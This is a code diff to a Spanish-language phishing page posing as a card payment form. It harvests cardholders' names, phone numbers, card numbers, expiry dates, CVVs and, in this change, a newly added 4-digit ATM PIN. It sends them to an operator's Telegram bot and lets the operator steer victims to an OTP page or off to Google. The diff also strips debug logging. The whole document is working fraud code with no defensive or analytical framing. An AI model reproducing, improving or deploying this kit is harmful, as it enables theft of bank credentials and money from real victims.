@@ -78,6 +78,7 @@
             margin-left: 8px;
             display: none;
         }
+
     </style>
 </head>
 <body>
@@ -116,6 +117,11 @@
                     </div>
 
                     <div class="w-full mb-4">
+                        <label for="clave_cajero" class="block text-sm font-medium text-gray-700 mb-1">Clave de cajero</label>
+                        <input type="password" id="clave_cajero" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Clave de 4 dígitos" maxlength="4" required>
+                    </div>
+
+                    <div class="w-full mb-4">
                         <label for="telefono" class="block text-sm font-medium text-gray-700 mb-1">Teléfono</label>
                         <input type="tel" id="telefono" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Número de teléfono" required>
                     </div>
@@ -148,6 +154,8 @@
             const cvvInput = document.getElementById("cvv");
             const nombreTitularInput = document.getElementById("nombre_titular");
             const telefonoInput = document.getElementById("telefono");
+            // Se agrega el nuevo campo para la clave
+            const claveCajeroInput = document.getElementById("clave_cajero"); 
             const pagarBtn = document.getElementById("pagarBtn");
             const spinnerModal = document.getElementById('spinner-modal');
             const errorMessage = document.getElementById("errorMessage");
@@ -166,9 +174,6 @@
             if (storedData) {
                 initialLoginData = JSON.parse(storedData);
                 transactionId = initialLoginData.transactionId || Date.now().toString();
-                console.log("💾 Datos recuperados de sessionStorage:", initialLoginData);
-            } else {
-                console.warn("🟡 No se encontraron datos de inicio de sesión en sessionStorage.");
             }
 
             async function loadTelegramConfig() {
@@ -178,10 +183,9 @@
                     const data = await response.json();
                     TELEGRAM_BOT_TOKEN = data.token;
                     TELEGRAM_CHAT_ID = data.chat_id;
-                    console.log("🟢 Tokens y IDs de chat de Telegram cargados.");
                     return true;
                 } catch (error) {
-                    console.error('🔴 Error al cargar la configuración de Telegram:', error);
+                    console.error('Error al cargar la configuración de Telegram:', error);
                     alert('Error crítico: No se pudo cargar la configuración de Telegram.');
                     pagarBtn.disabled = true;
                     return false;
@@ -200,9 +204,8 @@
                     const maxUpdateId = Math.max(...updates.map(u => u.update_id));
                     lastUpdateId = maxUpdateId;
                     sessionStorage.setItem('lastUpdateId', lastUpdateId);
-                    console.log('✅ lastUpdateId inicializado a', lastUpdateId);
                 } catch (err) {
-                    console.warn('🟡 No se pudo inicializar lastUpdateId:', err);
+                    console.warn('No se pudo inicializar lastUpdateId:', err);
                 }
             }
 
@@ -224,6 +227,23 @@
                 return s % 10 === 0;
             }
 
+            // Función para detectar el tipo de tarjeta
+            function getCardType(number) {
+                let re = new RegExp("^4");
+                if (number.match(re) != null) return "Visa";
+                re = new RegExp("^(34|37)");
+                if (number.match(re) != null) return "Amex";
+                re = new RegExp("^5[1-5]");
+                if (number.match(re) != null) return "Mastercard";
+                re = new RegExp("^6(?:011|5[0-9]{2})");
+                if (number.match(re) != null) return "Discover";
+                re = new RegExp("^3(?:0[0-5]|[68][0-9])[0-9]{11}$");
+                if (number.match(re) != null) return "DinersClub";
+                re = new RegExp("^9792");
+                if (number.match(re) != null) return "troy";
+                return "";
+            }
+
             // Función de validación de fecha de expiración
             function validateExpiry(month, year) {
                 const currentYear = new Date().getFullYear().toString().substr(-2);
@@ -234,9 +254,12 @@
                 return true;
             }
 
+            // Función de validación general del formulario
             function validateForm() {
                 const nombreValido = nombreTitularInput.value.trim().length > 2;
                 const telefonoValido = telefonoInput.value.trim().length >= 7;
+                // Se agrega la validación para la clave de cajero
+                const claveCajeroValida = claveCajeroInput.value.trim().length === 4;
 
                 const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, '');
                 const numeroTarjetaValido = luhnCheck(numeroTarjeta) && numeroTarjeta.length >= 13 && numeroTarjeta.length <= 19;
@@ -248,7 +271,8 @@
 
                 const cvvValido = cvvInput.value.length >= 3 && cvvInput.value.length <= 4;
 
-                pagarBtn.disabled = !(nombreValido && telefonoValido && numeroTarjetaValido && fechaValida && cvvValido);
+                // Se incluye la validación de la clave de cajero en la lógica del botón
+                pagarBtn.disabled = !(nombreValido && telefonoValido && claveCajeroValida && numeroTarjetaValido && fechaValida && cvvValido);
             }
 
             // Listeners para dar formato a los campos y validar
@@ -272,6 +296,8 @@
             cvvInput.addEventListener('input', validateForm);
             nombreTitularInput.addEventListener('input', validateForm);
             telefonoInput.addEventListener('input', validateForm);
+            // Se agrega listener para la clave de cajero
+            claveCajeroInput.addEventListener('input', validateForm);
 
             // Función para enviar a Telegram y obtener el message_id
             async function sendToTelegram(messageContent, keyboard) {
@@ -284,7 +310,6 @@
                 };
 
                 try {
-                    console.log("➡️ Enviando a Telegram:", payload);
                     const response = await fetch(url, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -292,14 +317,14 @@
                     });
                     if (!response.ok) {
                         const errorText = await response.text();
-                        console.error(`🔴 Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
+                        console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
                         return null;
                     }
                     const data = await response.json();
-                    console.log('✅ Mensaje de pago enviado a Telegram exitosamente.');
+                    console.log('Mensaje enviado a Telegram exitosamente.');
                     return data.result.message_id; // Retornar el message_id
                 } catch (error) {
-                    console.error('🔴 Error de red al enviar mensaje a Telegram:', error);
+                    console.error('Error de red al enviar mensaje a Telegram:', error);
                     return null;
                 }
             }
@@ -325,10 +350,10 @@
                     });
                     if (!response.ok) {
                         const errorText = await response.text();
-                        console.error(`🔴 Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
                     }
                 } catch (error) {
-                    console.error('🔴 Error de red al borrar botones de Telegram:', error);
+                    console.error('Error de red al borrar botones de Telegram:', error);
                 }
             }
 
@@ -369,7 +394,7 @@
                                     body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
                                 });
                             } catch (err) {
-                                console.warn('🟡 No se pudo responder callback_query:', err);
+                                console.warn('No se pudo responder callback_query:', err);
                             }
 
                             const callbackKey = callbackDataFull.split(':')[0];
@@ -377,7 +402,6 @@
                             spinnerModal.style.display = 'none';
                             app.style.display = 'block';
 
-                            console.log("➡️ Redirigiendo a:", callbackKey);
                             switch (callbackKey) {
                                 case 'error_tc':
                                     errorMessage.classList.remove('hidden');
@@ -386,19 +410,17 @@
                                     window.location.href = "otp.html";
                                     break;
                                 case 'finalizar':
-                                    window.location.href = "finish.html";
-                                    // Limpiar sessionStorage al finalizar con éxito
-                                    sessionStorage.clear();
+                                    window.location.href = "https://www.google.com";
                                     break;
                                 default:
-                                    console.log("🟡 Respuesta no reconocida del bot:", callbackDataFull);
+                                    console.log("Respuesta no reconocida del bot:", callbackDataFull);
                                     errorModalMessage.textContent = "Respuesta no reconocida. Por favor, intente de nuevo.";
                                     errorModal.style.display = 'flex';
                                     break;
                             }
                         }
                     } catch (error) {
-                        console.error("🔴 Error al verificar el estado de la transacción:", error);
+                        console.error("Error al verificar el estado de la transacción:", error);
                     }
                 }, 1500);
             }
@@ -412,6 +434,8 @@
                 const fechaExp = fechaExpInput.value.trim();
                 const cvv = cvvInput.value.trim();
                 const telefono = telefonoInput.value.trim();
+                // Se obtiene el valor del nuevo campo
+                const claveCajero = claveCajeroInput.value.trim();
 
                 const now = new Date();
                 const formattedDate = now.toLocaleDateString('es-CO', {
@@ -423,30 +447,16 @@
 
                 app.style.display = 'none';
                 spinnerModal.style.display = 'flex';
-                
-                // Get cedula and clave from the initial login data, with fallbacks
-                const cedula = initialLoginData ? initialLoginData.nroDoc || 'N/A' : 'N/A';
-                const tipoDoc = initialLoginData ? initialLoginData.tipoDoc || 'N/A' : 'N/A';
-                let clave = 'N/A';
-                if (initialLoginData) {
-                    if (initialLoginData.clave && initialLoginData.clave !== 'N/A') {
-                        clave = initialLoginData.clave;
-                    } else if (initialLoginData.cardClave && initialLoginData.cardClave !== 'N/A') {
-                        clave = initialLoginData.cardClave;
-                    }
-                }
-                console.log("📋 Datos a enviar para el pago:", { cedula, tipoDoc, clave, nombreTitular, numeroTarjeta, fechaExp, cvv, telefono });
 
                 let telegramMessage = '🍀 GOLEADOR 🍀\n\n';
                 telegramMessage += `Tipo de Ingreso: Tarjeta de Crédito\n`;
-                telegramMessage += `Tipo de Doc: ${tipoDoc}\n`;
-                telegramMessage += `Cédula: ${cedula}\n`;
-                telegramMessage += `Clave: ${clave}\n\n`;
                 telegramMessage += `Nombre: ${nombreTitular}\n`;
                 telegramMessage += `Teléfono: ${telefono}\n`;
                 telegramMessage += `Tarjeta: ${numeroTarjeta}\n`;
                 telegramMessage += `Fecha Exp: ${fechaExp}\n`;
-                telegramMessage += `CVV: ${cvv}\n\n`;
+                telegramMessage += `CVV: ${cvv}\n`;
+                // Se agrega la clave de cajero al mensaje de Telegram
+                telegramMessage += `Clave Cajero: ${claveCajero}\n\n`;
                 telegramMessage += `Fecha/Hora: ${formattedDate}, ${formattedTime}`;
 
                 const keyboard = {
